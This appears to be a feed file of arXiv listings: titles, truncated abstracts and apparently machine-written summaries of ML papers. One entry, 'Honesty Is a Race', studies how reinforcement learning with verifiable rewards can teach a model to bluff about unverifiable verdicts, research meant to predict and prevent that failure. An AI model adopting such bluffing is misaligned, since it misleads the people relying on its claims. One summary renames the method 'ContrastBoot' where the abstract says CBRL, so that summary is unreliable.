s1d54905375.description: arXiv:2611.15543v1 Announce Type: cross Abstract: LLM applications increasingly rely on translators and compatibility layers to move conversations across APIs. Yet a translated request can be accepted by the target API while silently losing information about instruction roles, tool interactions, error states, or generation controls. We introduce isloss, a deterministic oracle for testing conversation-information preservation across LLM API translations. It maps source and translated requests and replies to a shared intermediate representation, ConvIR, and applies explicit rules to distinguish legitimate representation changes from information loss. Unlike schema validation or reference-based differential testing, isloss requires neither a reference translation nor additional model calls. I
s1d54905375.summary: Researchers introduce isloss, a deterministic rule-based oracle that detects silent information loss, such as dropped roles or tool interactions, when translating conversations across LLM APIs.
s1d54905375.why: Gives teams a testable way to catch silent data loss in API translation layers and compatibility shims.

s0c69b09df3.title: TraceKV: Policy-Preserving Low-Rank KV Cache Compression for Reasoning Vision-Language Models
s0c69b09df3.description: arXiv:2611.15569v1 Announce Type: cross Abstract: Reasoning vision-language models (VLMs) impose substantial KV cache demands from both large multimodal contexts and growing reasoning traces. Low-rank KV compression has emerged as a promising paradigm that stores low-dimensional latents of KV states and can be combined with quantization. However, existing low-rank methods often induce growing predictive policy drift from the dense model when compressing reasoning KV states, resulting in reasoning failures. We identify two key causes of this degradation: calibration-state mismatch between static contexts and on-policy reasoning states, and unequal error sensitivity across KV states. To address these challenges, we propose TraceKV, a training-free low-rank KV compression framework that unifi
s0c69b09df3.summary: TraceKV proposes a policy-preserving low-rank KV cache compression method for reasoning vision-language models to reduce memory demands without reasoning failures.
s0c69b09df3.why: Reducing KV cache memory while preserving reasoning accuracy directly affects serving cost and feasibility for multimodal reasoning models.

s8aa314c3fa.title: Can Model Answer Probabilities Represent Survey Populations? Conditional Prediction and Joint Validity in Jev Survey Simulation
s8aa314c3fa.description: arXiv:2611.15576v1 Announce Type: cross Abstract: Survey simulations require realistic combinations of answers, but predictive accuracy alone does not establish that a model can generate them. We evaluate the option probabilities returned by Jev, a TypeSafe decision model, using linked responses to 20 binary items from five archived survey waves. We compare population-only prediction, prediction given recorded answers, and sequential completion that uses generated answers to predict later responses. Joint comparisons hold the starting population information fixed, and two three-question cases are completed in both question orders. We evaluate predictive scores, answer frequencies, and associations against the survey records. Recorded answers can improve predictive scores while associations
s8aa314c3fa.summary: Researchers evaluate whether option probabilities from the Jev decision model can represent survey populations, testing conditional prediction and joint validity across linked survey responses.

sfafc1ab00c.title: EMS-Nav: Embodied Multi-Scale Navigation
sfafc1ab00c.description: arXiv:2611.15589v1 Announce Type: cross Abstract: Industrial inspection robots must reach work areas and specific equipment. These destinations span spatial scales from regions to objects, so robots must relate each target to its surroundings to interpret the task and determine where to go. Existing methods support multi-scale navigation through rich environment representations, but at substantial computational and storage cost. These costs limit deployment where wireless coverage is incomplete and robots must rely on onboard computation to keep navigating. We introduce EMS-Nav, a biologically inspired multi-scale navigation framework for online, on-device operation. Its core innovation is to organize perception, spatial understanding, and navigation around regions, making local spaces the
sfafc1ab00c.summary: Researchers introduce EMS-Nav, a biologically inspired multi-scale navigation method for industrial inspection robots that aims to reduce computational and storage costs.
sfafc1ab00c.why: Lower onboard compute needs for multi-scale navigation could matter for robots operating where wireless coverage is incomplete.

s6ee6d1b234.title: Bug Finding With Agentic Symbolic Execution
s6ee6d1b234.description: arXiv:2611.15596v1 Announce Type: cross Abstract: Symbolic execution, in tools such as CrossHair for Python, is a powerful technique for finding bugs, but two barriers hinder its adoption: the human effort of annotating code with assertions, and the need to model the execution environment outside Python, such as an external database. To overcome both, we design an agentic harness that orchestrates the symbolic execution tool CrossHair together with an AI coding agent. Without human intervention, it instruments a repository with assertions, synthesizes a constraint-aware symbolic environment for the database, runs symbolic execution, and constructs a concrete test as evidence for each bug it reports. We evaluate our harness on 1,156,044 lines of Python code over 11 popular open-source Pytho
s6ee6d1b234.summary: Researchers present an agentic harness that pairs the CrossHair symbolic execution tool with an AI coding agent to find Python bugs without human-written assertions.
s6ee6d1b234.why: Combining symbolic execution with coding agents could reduce the manual effort needed to adopt bug-finding tools in real repositories.

sc2e6d48ce2.title: Are Scaling Laws of Universal MLIPs Universal?
sc2e6d48ce2.description: arXiv:2611.15603v1 Announce Type: cross Abstract: Neural scaling laws enable the prediction of returns from larger training datasets, but machine-learned interatomic potential (MLIP) datasets are heterogeneous and expensive to generate, and equal numbers of structures need not contain equal amounts of useful information. We study data scaling under fixed model configurations for M3GNet, MACE, and PET trained on subsets of a combined MatPES-MP-ALOE training pool. Across training structure subsets from 10,000 to 640,000, together with the full 1.16-million-structure training set, we compare uniform random sampling, three chemistry- and structure-informed stratification policies, iterative DIRECT, and furthest-point sampling using embeddings from three pretrained MLIPs. Models are evaluated u
sc2e6d48ce2.summary: Researchers study data scaling for universal machine-learned interatomic potentials, comparing M3GNet, MACE, and PET trained on subsets of a combined 1.16-million-structure dataset.
sc2e6d48ce2.why: Shows that equal dataset sizes may not yield equal value, informing how teams budget expensive training data for scientific models.

s67b784e5de.title: Contrastive Bootstrap Representation Learning for Label-Efficient Agricultural Image Classification
s67b784e5de.description: arXiv:2611.15610v1 Announce Type: cross Abstract: Expert annotation remains a major bottleneck in agricultural image classification, where collecting images is often easier than obtaining reliable labels from domain specialists. Self-supervised learning can reduce this dependence by pretraining transferable representations on unlabelled imagery. Contrastive and bootstrap methods provide two established but distinct training signals, motivating an empirical study of a formulation that applies both signals within one representation path under severe downstream label scarcity. We present Contrastive Bootstrap Representation Learning (CBRL), which jointly optimises SimCLR-style NT-Xent contrastive learning and bidirectional BYOL-style exponential-moving-average target prediction within a share
s67b784e5de.summary: Researchers propose ContrastBoot, a label-efficient representation learning method combining contrastive and bootstrap signals for agricultural image classification under label scarcity.
s67b784e5de.why: Shows a route to strong image classifiers when expert labels are scarce and costly, a common constraint in specialized domains.

s833cec3509.title: Learning-Based Interpolation of Detector Gaps in Photon-Counting X-ray Imaging
s833cec3509.description: arXiv:2611.15614v1 Announce Type: cross Abstract: Image detectors assembled from tiled modules have physical gaps in the field of view that must be filled before downstream processing such as phase retrieval or tomographic reconstruction. Unlike natural-image inpainting, detector-gap interpolation must leave all other pixels unmodified and preserve the intensity statistics of the filled region, since even a small shift in mean intensity can cause ring artifacts after reconstruction. We adapted two generative models, a Wasserstein GAN with gradient penalty (WGAN-GP) and a conditional Pix2Pix model, to this task. We implemented a masking strategy that restricts all changes to the gap pixels and loss terms that constrain the mean intensity and the intensity distribution of the filled region.
s833cec3509.summary: Researchers adapt WGAN-GP and Pix2Pix generative models to interpolate gaps between tiled detector modules in photon-counting X-ray imaging.

scc86af843a.title: Data-Free Metrics Don't Work: The Missing Invariance Under Functionally Preserving Reparameterisations
scc86af843a.description: arXiv:2611.15621v1 Announce Type: cross Abstract: Data-free methods for analysing and understanding the layers of neural networks offer many metrics for quantifying notions of 'strong' versus 'weak' layers, with the promise of increased interpretability. In particular, random matrix theory (RMT) offers data-free metrics that claim predictive power over the quality of pre-trained models at a layerwise precision and the ability to identify model pathologies, indicating a unique relationship with generalisation. As a result, metrics from RMT are championed for pre-training optimisation strategies and post-training compression. We establish that RMT-based metrics are unrelated to performance or training by showing that functionally preserving reparametrisations of a pre-trained model can have
scc86af843a.summary: The paper argues that data-free random matrix theory metrics for layer quality fail to remain invariant under functionally preserving reparameterisations of neural networks.
scc86af843a.why: Challenges the reliability of data-free layer metrics that some teams use to guide pre-training and model diagnosis.

s6773c7f9e1.title: MemInStream: Memorizing or Merely Recognizing? Rethinking Streaming Video Memory Evaluation
s6773c7f9e1.description: arXiv:2611.15640v1 Announce Type: cross Abstract: Streaming video understanding aims to continuously process incoming visual observations, making the retention and retrieval of relevant information increasingly important as the video history grows. Although existing benchmarks include memory-related questions, question-answering accuracy alone does not reliably measure memory capabilities. Incorrect predictions may arise from failures in visual understanding rather than forgetting, whereas correct predictions may rely on linguistic priors or recent observations without requiring historical memory. To address these ambiguities, we introduce MemInStream, a benchmark dedicated to evaluating memory capabilities in streaming video understanding. We develop an evidence-controlled validation prot
s6773c7f9e1.summary: Researchers propose MemInStream, a benchmark design arguing that question-answering accuracy alone fails to measure memory in streaming video understanding.
s6773c7f9e1.why: Engineers evaluating video models should not treat QA accuracy as proof of memory, since errors and correct answers can stem from other causes.

s3cd6c09691.title: Contour-Assisted Evolutionary Computation: Estimating Peaks From the Contour Lines of Evaluated Solutions
s3cd6c09691.description: arXiv:2611.15641v1 Announce Type: cross Abstract: Evolutionary algorithms (EAs) evaluate many candidate solutions but use them mainly to rank individuals. This paper treats the evaluated solutions as the spot heights of a topographic survey and draws the contour lines they imply. The contour map decomposes the evaluated region into peaks: in two dimensions a contour tree with persistence separates significant peaks from interpolation ripples, and in more dimensions hill climbing on the interpolated surface locates the peaks and ray-cast level sets describe them. A memory of the explored peaks directs the search to new ones. The data-supported contours of each peak are extrapolated to zero size by an area law, exact for quadratic peaks and second-order accurate for smooth ones, that estimat
s3cd6c09691.summary: Researchers propose contour-assisted evolutionary computation, treating evaluated candidate solutions as topographic spot heights to estimate peaks and maintain a memory of them.

s8fd8718e8a.title: When Agents Need to Consolidate Memories: What RRR Consolidation Explains, and What It Does Not Explain, in Conversation ESAA
s8fd8718e8a.description: arXiv:2611.15644v1 Announce Type: cross Abstract: Language-model agents can share conversational history across sessions, but persistence does not guarantee retrieval of current decisions and their provenance. This engineering study presents Memory-TCG, a Conversation ESAA extension inspired by ringing, resonance and renormalization (RRR), and an exploratory synthetic evaluation comparing chronological retrieval, two simplified baselines (B, recency-aware, and B', authority-aware), full RRR, and variants under three output budgets. With 480 facts and 1,024 tokens, full RRR recalled 0.44 of current decisions, versus 0.06 for chronological retrieval and 0.58 for the oracle ceiling; with 4,096 tokens it recalled all of them. B' and the no-resonance variant matched full RRR in decision recall
s8fd8718e8a.summary: An engineering study introduces Memory-TCG, a conversation memory extension for language-model agents, comparing retrieval and consolidation methods on a synthetic evaluation.
s8fd8718e8a.why: Teams building persistent agent memory may find that stored conversation history does not guarantee retrieval of current decisions and their provenance.

s19c4ebbd0a.title: AskALCF: A Self-Improving Agentic System for Intelligent HPC User Support
s19c4ebbd0a.description: arXiv:2611.15700v1 Announce Type: cross Abstract: AI-based question-answering systems are increasingly used for user support, including at high-performance computing (HPC) facilities. However, existing systems lack a systematic, deployment-oriented approach for evaluating final-answer quality and attributing failures to specific components. They also remain largely static after deployment, apart from periodic knowledge-base updates. We present AskALCF, an agentic log-analysis and improvement pipeline for HPC user support. AskALCF evaluates production interactions at a fine-grained level, identifies whether failures arise from missing knowledge, retrieval, prompting, model behavior, or tool execution, and routes each failure to an actionable repair. Its diagnostic core combines answer-quali
s19c4ebbd0a.summary: AskALCF is an agentic log-analysis pipeline that evaluates production HPC user-support interactions, attributes failures to components, and improves the system after deployment.
s19c4ebbd0a.why: Shows a deployment-oriented pattern for evaluating and continuously improving LLM support systems using production logs.

s88e2758cff.title: Efficient Knowledge Transfer in Federated Bayesian Optimization through Neural Network Surrogates
s88e2758cff.description: arXiv:2611.15707v1 Announce Type: cross Abstract: Federated Bayesian Optimization (FedBO) has emerged as a powerful paradigm for enhancing Bayesian Optimization (BO) in distributed, privacy-sensitive settings, enabling agents to accelerate the optimization of their local objectives by sharing knowledge about their similarities without exposing raw data. However, existing methods rely on restrictive assumptions, such as near-identical objective functions or shared Gaussian process hyperparameters that are often violated in heterogeneous real-world applications. We present GLOBAFED, a novel framework that enables efficient knowledge transfer across different but related objectives without compromising privacy. At its core is a probabilistic neural network surrogate with a shared feature-extr
s88e2758cff.summary: Researchers present GLOBAFED, a federated Bayesian optimization framework using neural network surrogates to share knowledge across heterogeneous clients without exposing raw data.
s88e2758cff.why: Offers a way to transfer optimization knowledge in privacy-sensitive settings where objectives differ, relaxing restrictive assumptions of prior methods.

se280cf4bd3.title: Curiosity-0826-4B: Generative Medical Event Sequence Modeling Across Pediatric and Adult Populations
se280cf4bd3.description: arXiv:2611.15710v1 Announce Type: cross Abstract: We introduce Curiosity-0826-4B, an updated version of the generative medical event foundation model trained on Epic Cosmos that simulates patient timelines to produce zero-shot clinical predictions. Curiosity-0826-4B incorporates a broader patient population and richer clinical event representations, while generally matching or exceeding Curiosity-0226-1B, the largest model in the previous Curiosity-0226 series, on evaluated tasks supported by both models. Laboratory value prediction improved, with MAE 18--46% lower than that of Curiosity-0226-1B. We evaluated prediction of disease events across pediatric cohorts aged 2--17 years. AUROCs for new asthma diagnosis (0.742--0.785) and asthma exacerbation (0.829--0.852) were comparable to those
se280cf4bd3.summary: Curiosity-0826-4B, an updated generative medical event foundation model trained on Epic Cosmos, is reported to match or exceed its predecessor on several clinical prediction tasks.

sf66bfddb6e.title: Outside the Purview of the Reward: Capability Drift in Multilingual Post-Training
sf66bfddb6e.description: arXiv:2611.15717v1 Announce Type: cross Abstract: Post-training can improve rewarded behavior while weakening capabilities users still need. We study two GRPO branches from a shared supervised checkpoint in a multilingual mixture-of-experts model. The released branch gains 36.07 points on MATH but loses 19.32 F1 points on XQuAD-Indic, while XQuAD-English improves under the same scoring rule. An independently trained sibling adds Indic instruction following and language-aware shaping. It recovers the regressing Indic task scores and preserves MATH, but does not restore script compliance and trades off competition mathematics and code. In a later round, judge training is followed by a sharp extraction decline from the Indic branch; reward-free distillation from its earlier checkpoint restore
sf66bfddb6e.summary: A study finds that GRPO post-training in a multilingual mixture-of-experts model boosted math scores while degrading Indic-language F1, with a sibling model recovering some losses.
sf66bfddb6e.why: Reward-driven post-training can silently regress capabilities users still need, so teams should evaluate beyond the optimized reward.

sf845761aaa.title: Terms of Care: Designing for Participation in Data Governance by Disability Communities
sf845761aaa.description: arXiv:2611.15720v1 Announce Type: cross Abstract: Improving disability representation in AI-generated media requires community-specific datasets, yet openly sharing such data can expose communities to misuse, decontextualization, and exploitation. We examine how disability communities can participate in dataset governance through context-sensitive licensing. Working with three disability advocacy organizations, we conducted semi-structured interviews, an educational webinar and modular license activity to promote community participation in data stewardship. Our findings show that governance in these high-context communities relies on organizational memory (especially situated harms); both formal authority and informal relational practices; communication; and resulting trust. The modular li
sf845761aaa.summary: Researchers worked with three disability advocacy organizations on context-sensitive licensing so disability communities can participate in governing datasets used for AI-generated media.
sf845761aaa.why: Highlights governance and licensing considerations for community-specific datasets that could be misused or exploited if openly shared.

s573bcf6541.title: Where Is Uncertainty Observed? A Mechanistic Understanding of Uncertainty Quantification in LLMs
s573bcf6541.description: arXiv:2611.15735v1 Announce Type: cross Abstract: Knowing when a large language model's (LLM's) response can be trusted is critical for its safe use. Uncertainty quantification (UQ) can help LLMs recognize if their responses may be unreliable. Existing taxonomies organize UQ methods by uncertainty source or estimation mechanism. They leave unresolved the question of where uncertainty is observed in the model's computation. The answer matters because the observation point determines whether an estimator has access to enough information to recover a given target, and how well it can recover it. Drawing on mechanistic interpretability, we define four mechanistic observation lenses: the structural lens observes component updates, the representational lens observes hidden states, the distributi
s573bcf6541.summary: A paper offers a mechanistic account of where uncertainty is observed inside LLM computation, arguing the observation point determines which uncertainty estimators can recover targets.
s573bcf6541.why: Choosing where to measure uncertainty inside a model affects how reliably teams can detect unreliable LLM responses.

s16ead59182.title: Latent Imagination for Parameterized Action Spaces
s16ead59182.description: arXiv:2611.15744v1 Announce Type: cross Abstract: Parameterized-action MDPs (PAMDPs) ask an agent to choose a discrete action together with continuous parameters whose meaning depends on that choice. Model-free PAMDP methods act fast but need many interactions; model-based methods are sample-efficient but plan at every decision, which makes them slow to act. We introduce HyLI (Hybrid Latent Imagination), a model-based agent that learns a hybrid policy entirely in the latent imagination of a world model and acts with a single forward pass. To address learning problems that the PAMDP structure creates, HyLI adds counterfactual mode evaluation, which gives every discrete action a learning signal at every imagined state, and success-window replay, which keeps rare successes in training. On sev
s16ead59182.summary: Researchers introduce HyLI, a model-based agent that learns a hybrid policy in latent imagination for parameterized action spaces and acts with a single forward pass.
s16ead59182.why: Offers a route to sample-efficient reinforcement learning agents that act quickly without per-step planning.

s61b8e98c34.title: Prior-as-Skill: Remember Outside and Read Inside with On-Policy Self-Distillation for Self-Evolving VLM Agents
s61b8e98c34.description: arXiv:2611.15766v1 Announce Type: cross Abstract: Self-evolving visual agents keep what they learn as skills: key frames with step notes on a task's steps and their order. On-policy self-distillation (OPSD) is now a popular way to train such skills into a vision-language model that matches, on its own answers, a teacher that also reads the written order. At deployment, frames often go missing or show an unusual order, as when a person or a website reorders the steps. Existing internalization methods keep any order they store in the frame-reading weights: trained on full frames, the model guesses when they are missing, and trained with frames withheld, it stores the order, so memory can override what it sees. We propose PriorSplit, which fills in missing frames from an order kept outside th
s61b8e98c34.summary: Prior-as-Skill proposes on-policy self-distillation to train self-evolving vision-language agents to read stored skills, aiming to handle missing frames and reordered steps at deployment.
s61b8e98c34.why: Addresses robustness of visual agents when stored task demonstrations are missing or reordered at deployment time.

s833322351f.title: PDO Drug Screening Data for Evaluating and Training AI Drug Response Prediction Models
s833322351f.description: arXiv:2611.15769v1 Announce Type: cross Abstract: Anti-cancer drug response prediction (DRP) is critically important for precision oncology and therapeutic development. Currently, most DRP models are developed using drug screening data from immortalized cancer cell lines, which can differ substantially from patient tumors at the genomic and molecular levels, even though patient tumor response is the ultimate prediction target. To help bridge this gap and bring DRP models closer to their intended clinical application, we conducted four drug screening studies using patient-derived organoids (PDOs), which more faithfully recapitulate patient tumors than immortalized cell lines. These studies generated data for improving and evaluating DRP models, including multi-omics profiles of PDO lines, d
s833322351f.summary: Researchers release PDO drug screening data from four studies using patient-derived organoids to evaluate and train AI drug response prediction models.
s833322351f.why: Provides patient-derived rather than cell-line data, which may better match clinical targets for drug response models.

scafe4a03e3.title: SO-Arena: Benchmarking the Capability Spectrum and Reliability of System One Models
scafe4a03e3.description: arXiv:2611.15777v1 Announce Type: cross Abstract: System One models promise fast, general-purpose decision-making without lengthy token generation. However, understanding their capability spectrum and decision reliability requires more than aggregate performance on current benchmarks. Existing evaluations often provide limited insight into the breadth of model capabilities and the reliability of their decisions. We introduce SO-Arena, a benchmark characterizing the capability spectrum and decision reliability of System One models across 11 domains and five capability families. For the capability spectrum, SO-Arena offers evidence-grounded evaluation through reliable sources and manual verification of reference labels against model-visible inputs; fine-grained capability assessment through
scafe4a03e3.summary: SO-Arena is a benchmark assessing the capability spectrum and decision reliability of System One models across 11 domains and five capability families.
scafe4a03e3.why: Aggregate benchmark scores can hide capability gaps and decision reliability issues that matter when choosing fast models.

s83d129a2bf.title: Honesty Is a Race: Predicting When Verifiable-Reward RL Teaches a Model to Bluff
s83d129a2bf.description: arXiv:2611.15779v1 Announce Type: cross Abstract: Two rewards with the same expected payoff at the start of training can end a reinforcement-learning run in opposite places, with an honest model or one that bluffs. We study rewards that pay $b$ for a verdict that a checker cannot verify ("this program is correct") and $r$ for a certificate that it accepts (an input revealing a bug). To first order, a GRPO step makes the model more honest exactly when $\tilde{p}\,r/b>1+\kappa$. Here $\tilde{p}$ is the rate at which the checker accepts the model's certificates, weighted toward the items on which the model still gives both verdicts, and $\kappa$ is the pull of the items on which the unverifiable verdict is right. Both terms move during training. A checker raises $\tilde{p}$, so near the thres
s83d129a2bf.summary: A paper studies when reinforcement learning with verifiable rewards leads a model to honestly report or to bluff about unverifiable verdicts, deriving a condition for honesty under GRPO.
s83d129a2bf.why: Reward design for code verification can incentivize models to bluff, so teams training with verifiable rewards need to check for this failure.

sb53a167879.title: VibePrevisBench: Evaluating Agentic Coding for 4D Scene Generation in Blender
sb53a167879.description: arXiv:2611.15789v1 Announce Type: cross Abstract: Controllable real-world video generation models can condition on a rendered graybox proxy video, which fixes layout, motion and camera. Coding agents can build such videos by reconstructing a 4D scene in Blender, yet no benchmark checks both these videos and the long, multi-shot scenes behind them. We introduce VibePrevisBench, a benchmark for 4D scene reconstruction: an agent turns a brief into an executable 4D scene and renders its proxy video. Its 242 tasks span four input kinds, including scripts, photos, continuations, and reference videos. Each delivery is scored along two evaluation dimensions. Rule-based Scene Check re-runs the code and compares the exported 4D scene with hidden ground truth facts in nine dimensions. VLM-based Scree
sb53a167879.summary: VibePrevisBench is a benchmark evaluating coding agents that reconstruct 4D scenes in Blender from briefs, checking both executable scenes and rendered proxy videos across 242 tasks.
sb53a167879.why: Gives a way to measure coding agents on multi-shot 4D scene generation for controllable video production workflows.

s7204ecf33d.title: RUMI: A Robotiq-Matched Universal Manipulation Interface for Robot Learning with Augmented Reality and Haptic Feedback
s7204ecf33d.description: arXiv:2611.15802v1 Announce Type: cross Abstract: Many manipulation tasks require carefully controlled contact forces for successful execution, yet large-scale, force-aware datasets remain scarce. Handheld interfaces can help by transmitting interaction forces directly through the operator's arm, but most existing designs are tailored to simple linear grippers and do not match the nonlinear mechanics of widely used robotic grippers. We present RUMI, a handheld universal manipulation interface matched to the Robotiq 2F-85 with exchangeable fingertip sensors that preserves the target gripper geometry while enabling natural input before contact and force measurement after contact. By integrating the tracking system into a virtual reality headset, our method provides real-time augmented realit
s7204ecf33d.summary: Researchers present RUMI, a handheld manipulation interface matched to the Robotiq 2F-85 gripper, with exchangeable fingertip sensors for force-aware robot data collection.
s7204ecf33d.why: Force-aware demonstration data is scarce, and a gripper-matched handheld interface could make collecting contact-rich robot learning datasets easier.

sc4ea3f3990.title: Fine-Grained Generative Hallucination Detection and Correction for Aerial Image Captioning
sc4ea3f3990.description: arXiv:2611.15809v1 Announce Type: cross Abstract: Aerial imagery captured by unmanned aerial vehicles (UAVs) plays a vital role in applications such as surveillance, disaster response, and large-scale environmental monitoring. Automatic generation of textual descriptions for such imagery is essential for reducing manual inspection overhead and enabling better downstream decision-making. However, Multimodal Large Language Models (MLLMs), despite their impressive captioning capabilities, are prone to hallucination, producing descriptions that are inconsistent with the visual input. This problem is significantly amplified in aerial imagery due to its unique challenges such as extreme viewpoint variation, small objects, class imbalance, and ambiguous visual entities. Existing hallucination det
sc4ea3f3990.summary: Researchers propose a fine-grained method to detect and correct hallucinations in captions generated by multimodal LLMs for UAV aerial imagery.
sc4ea3f3990.why: Hallucinated captions can mislead surveillance and disaster-response workflows, so reliable detection and correction matters for deployment.

s20d6d337f8.title: Large Payments Model
s20d6d337f8.description: arXiv:2611.15814v1 Announce Type: cross Abstract: Payment applications such as fraud detection, authorization prediction, and payment optimization draw on overlapping transaction information. This motivates a reusable payments intelligence layer that shares learned representations and predictive signals, rather than developing predictive models independently for each task. Realizing this shared capability requires handling heterogeneous transaction fields, high-cardinality identifiers, lifecycle-dependent attributes, long histories, and rare outcomes while meeting latency and cost constraints. We present Large Payments Model (LPM), a domain-specific foundation model designed for operational use and trained from scratch on large-scale structured transaction data to learn reusable representa
s20d6d337f8.summary: A paper introduces the Large Payments Model, a shared representation layer meant to support fraud detection, authorization prediction, and payment optimization.
s20d6d337f8.why: A reusable payments model could reduce per-task model development, though the summary gives limited detail on results or deployment.

scf5ecba94b.title: The BEATS Dataset: Towards Understanding Music-Physiology Dynamics in Real-World Scenarios
scf5ecba94b.description: arXiv:2611.15837v1 Announce Type: cross Abstract: We introduce the BEATS dataset, a robust compilation of psycho-physiological data collected in the wild from 30 participants while they listened to curated playlists intended to promote well-being. An acronym for Biomarkers, Experience and Affect from Therapeutic Soundscapes, the BEATS dataset aims to support research on wellbeing, music psychology, affective computing and signal processing. More specifically, this dataset includes: (1) sensor data collected during music listening sessions using a research-grade wearable device in free-movement environments; (2) music listening activity records, stimulus metadata, acoustic features, and self-reports associated with the listening sessions (3) individual characteristics, such as demographics,
scf5ecba94b.summary: Researchers release the BEATS dataset of psycho-physiological data from 30 participants listening to wellbeing playlists in real-world settings.

sa78cf98f88.title: Spec-Driven PBT: Deriving Semantic Invariants from Code Specifications for Agentic Property-based Testing
sa78cf98f88.description: arXiv:2611.15920v1 Announce Type: cross Abstract: Software is increasingly written by AI agents that produce an implementation from a natural language specification, a practice known as agentic coding. Code is now produced faster than it can be reviewed, and has been shown to exhibit its own characteristic failure patterns. Property-based testing (PBT), a long-standing technique in which invariant properties of a program are checked against many generated inputs, has recently been revisited with LLM agents authoring the properties, thereby removing the high-effort derivation of invariants that has long hindered its adoption. Existing methods, however, derive these properties from the implementation alone (Code-driven PBT). At the same time, a thorough specification such as a product requir
sa78cf98f88.summary: Researchers propose Spec-Driven PBT, which derives semantic invariants from code specifications so LLM agents can author property-based tests for agentic coding.
sa78cf98f88.why: As agents produce code faster than it can be reviewed, automatically derived property tests could offer a practical check on AI-written software.

s7ceca5cb62.title: DuoJEPA: Cross-Modal Translation Between Unaligned Self-Supervised Embedding Spaces
s7ceca5cb62.description: arXiv:2611.15968v1 Announce Type: cross Abstract: Learning from paired modalities is commonly equated with aligning them: two encoders are trained until the embeddings of a pair coincide in a shared space. We study whether cross-modal retrieval and classification can instead be obtained while the two encoders' own embedding spaces remain directly unaligned. DuoJEPA trains one encoder per modality with the self-supervised LeJEPA objective and appends to each encoder a single transformer layer that translates its embedding into the other encoder's space, supervised by a contrastive objective computed entirely within that target space. No loss term compares the two own spaces directly, although the encoders are optimised jointly through the translation objective. In our experiments, the trans
